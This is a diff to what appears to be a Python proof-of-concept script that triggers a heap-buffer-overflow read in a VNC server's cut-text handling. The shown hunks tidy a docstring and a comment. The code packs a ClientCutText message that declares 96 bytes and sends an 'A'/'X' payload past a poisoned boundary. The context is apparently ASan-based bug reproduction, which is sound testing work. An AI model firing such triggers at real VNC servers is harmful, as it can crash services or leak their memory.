@@ -24,7 +24,7 @@ bytes [32..length-1], then memcpy's `length` bytes from str — crossing the
 poison boundary and triggering an ASan heap-buffer-overflow READ.
 
 We send `length` = SANE_MAX + OVERREAD (e.g. 32 + 64 = 96 declared bytes)
-but only transmit PAYLOAD_BYTES (96) of actual data so rfbReadExact() reads
+but only transmit DECLARED_LEN (96) of actual data so rfbReadExact() reads
 exactly what we claim and passes all bytes to setXCutText.
 
 Usage:
@@ -135,7 +135,8 @@ def send_cuttext_trigger(sock: socket.socket) -> None:
     # ">B3xI": u8 type, 3 pad bytes (x = zero pad), u32 length big-endian
     header = struct.pack(">B3xI", 6, DECLARED_LEN)
 
-    # Payload: DECLARED_LEN bytes; fill with 'A's for visibility
+    # Payload: DECLARED_LEN bytes; fill the sane region with 'A' and the
+    # over-read region with 'X' for visibility
     # (first SANE_MAX bytes land in the sane region; next OVERREAD bytes
     # trigger the over-read past the poison boundary)
     payload = b"A" * SANE_MAX + b"X" * OVERREAD
